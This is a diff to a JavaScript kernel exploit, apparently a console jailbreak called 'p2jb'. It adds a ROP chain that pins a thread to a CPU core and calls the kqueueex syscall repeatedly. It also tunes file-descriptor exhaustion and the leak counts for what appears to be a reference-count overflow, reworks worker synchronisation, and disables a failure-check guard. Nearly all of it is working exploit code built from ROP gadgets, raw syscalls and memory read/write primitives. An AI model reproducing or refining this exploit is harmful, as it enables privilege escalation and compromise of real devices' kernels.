@@ -193,7 +193,10 @@
         const MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
 
-        const LEAK_CORES = [0, 1];
+        const LEAK_CORES = [0, 1, 2];
+        const LEAK_SYSCALLS = 0x100000001n;
+        const LEAK_FD_MAX = 8192n
+        const LEAK_SYSCALLS_FINAL = 0xFEDn;
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -475,7 +478,57 @@
             emit(ROP.pop_rdi); emit(0n);
             emit(syscall_wrapper);
 
-            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
+            return { buf, entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
+        }
+
+        function build_kqueueex_final_chain(count, core, finished_addr) {
+            const POC_ARG = 0x800000000000n;
+            const STACK_SIZE = 0x4000 + (Number(count) * 6 + 256) * 8;
+
+            const buf = malloc(STACK_SIZE);
+            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
+            const chain_view = new BigUint64Array(chain_ab);
+            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
+            chain_view.fill(0n, 0, 0x800);
+
+            const entry = buf + 0x4000n;
+            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts
+
+            const mask = malloc(0x10);
+            write64_uncompressed(mask + 0x0n, 1n << BigInt(core));
+            write64_uncompressed(mask + 0x8n, 0n);
+
+            let idx = 0;
+            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
+
+            emit(ROP.ret);
+            emit(ROP.ret);
+
+            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
+            emit(ROP.pop_rdi); emit(3n);
+            emit(ROP.pop_rsi); emit(1n);
+            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
+            emit(ROP.pop_rcx); emit(0x10n);
+            emit(ROP.pop_r8); emit(mask);
+            emit(syscall_wrapper);
+            emit(ROP.ret);
+
+            for (let k = 0; k < Number(count); k++) {
+                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
+                emit(ROP.pop_rdi); emit(POC_ARG);
+                emit(syscall_wrapper);
+                emit(ROP.ret);
+            }
+
+            emit(ROP.pop_rax); emit(1n);
+            emit(ROP.pop_rdi); emit(finished_addr);
+            emit(ROP.mov_qword_rdi_rax);
+
+            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
+            emit(ROP.pop_rdi); emit(0n);
+            emit(syscall_wrapper);
+
+            return entry;
         }
 
         function fail(msg) { throw new Error("p2jb: " + msg); }
@@ -954,26 +1007,29 @@
             write64_uncompressed(rl + 8n, nofile_hard);
             syscall(SYSCALL.setrlimit, 8n, rl);
 
-            const cand = ["/dev/", "/", "/app0/", "/dev/urandom",
+            const cand = ["/dev/null", "/dev/", "/", "/app0/", "/dev/urandom",
                 "/dev/notification0", "/dev/gc"];
             let held_path = 0n;
+            let held_path_str = 0n;
             for (let c = 0; c < cand.length; c++) {
                 const sp = alloc_string(cand[c]);
-                const a = syscall(SYSCALL.open, sp, 0n);
+                const a = syscall(SYSCALL.open, sp, O_RDONLY);
                 if (a === 0xffffffffffffffffn) continue;
                 const b = syscall(SYSCALL.open, sp, 0n);
                 syscall(SYSCALL.close, a);
                 if (b === 0xffffffffffffffffn) continue;
                 syscall(SYSCALL.close, b);
                 held_path = sp;
+                held_path_str = cand[c];
                 break;
             }
+
             const new_free_fd = () => held_path !== 0n
-                ? syscall(SYSCALL.open, held_path, 0n)
+                ? syscall(SYSCALL.open, held_path, O_RDONLY)
                 : syscall(SYSCALL.socket, 28n, 2n, 0n);
 
             const probe_fds = [];
-            for (let i = 0; i < 8192; i++) {
+            for (let i = 0; i < LEAK_FD_MAX; i++) {
                 const pfd = new_free_fd();
                 if (pfd === 0xffffffffffffffffn) break;
                 probe_fds.push(pfd);
@@ -992,11 +1048,13 @@
                     " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                     BURST_MIN + "); fd_budget=" + fd_budget);
 
+            logger.log("prepare_fds: free_fd_path=" + held_path_str + " fd_budget=" + fd_budget);
+
             syscall(SYSCALL.setuid, 1n);
 
             nanosleep_ms(10000);
 
-            const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);
+            const TOTAL_SYSCALLS = LEAK_SYSCALLS - LEAK_SYSCALLS_FINAL - BigInt(free_fds_num);
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
@@ -1032,6 +1090,8 @@
                     normal: normal_w, queued: 0n
                 });
             }
+            const final_chain_done_ptr = malloc(8);
+            const final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr);
 
             const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
             const _sleep_ts = malloc(16);
@@ -1059,34 +1119,57 @@
 
             _cr_disable_caching();
 
-            // logger.log("feeding done, waiting for workers to finish");
+            logger.log("feeding done, waiting for workers to finish");
 
             for (const lw of lws) {
-                while (true) {
-                    write64_uncompressed(lw.finished, 0n);
-                    nanosleep_ms(3000);
-                    if (read64_uncompressed(lw.finished) === 0n) break;
-                }
+                write64_uncompressed(lw.finished, 0n);
             }
+            while (true) {
+                nanosleep_ms(3000);
+                let all_idle = true;
+                for (const lw of lws) {
+                    if (read64_uncompressed(lw.finished) !== 0n) {
+                        all_idle = false;
+                        write64_uncompressed(lw.finished, 0n);
+                    }
+                }
+                if (all_idle) break;
+            }
+            logger.log("all workers idle, updating pivot");
             for (const lw of lws) {
                 write64_uncompressed(lw.chain.pivotAddr, lw.chain.exitAddr);
                 write64_uncompressed(lw.finished, 0n);
                 syscall(SYSCALL.write, lw.wfd_big, chunkbuf, 1n);
             }
-            for (const lw of lws) {
+            for (let i = 0; i < lws.length; i++) {
+                const lw = lws[i];
                 const dl = Date.now() + 15000;
                 while (read64_uncompressed(lw.finished) !== EXIT_MARK && Date.now() < dl)
-                    nanosleep_ms(50);
+                    nanosleep_ms(500);
+                if (read64_uncompressed(lw.finished) !== EXIT_MARK) {
+                    logger.log("worker " + i + " timeout waiting for EXIT_MARK");
+                }
                 syscall(SYSCALL.close, lw.rfd_big);
                 syscall(SYSCALL.close, lw.wfd_big);
             }
 
+            logger.log("launching kqueueex_final_chain...");
+            write64_uncompressed(final_chain_done_ptr, 0n);
+            spawn_leak_worker(final_chain_entry);
+            logger.log("Waiting for kqueueex_final_chain to complete...");
+            while (read64_uncompressed(final_chain_done_ptr) === 0n) {
+                nanosleep_ms(500);
+            }
+
+            logger.log("kqueueex_final_chain finished successfully. preparing free-fd");
             for (let i = 0; i < free_fds_num; i++) {
                 const fd = new_free_fd();
                 if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                 S.free_fds.push(Number(fd));
             }
-            logger.log("feeding complete, stage 0 in 10s");
+
+            logger.log("prepare_fds complete, stage 0 in 10s");
+
             syscall(SYSCALL.setuid, 1n);
             nanosleep_ms(10000);
         }
@@ -2013,12 +2096,12 @@
                 return;
             }
 
-            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
-            if (file_exists(failcheck_path)) {
-                logger.log("aborting, failcheck path exists: " + failcheck_path);
-                return;
-            }
-            write_file(failcheck_path, "");
+            // failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
+            // if (file_exists(failcheck_path)) {
+            //     logger.log("aborting, failcheck path exists: " + failcheck_path);
+            //     return;
+            // }
+            // write_file(failcheck_path, "");
         } catch (_) { failcheck_path = null; }
 
         logger.log(p2jb_version +" FW: " + FW_VERSION);
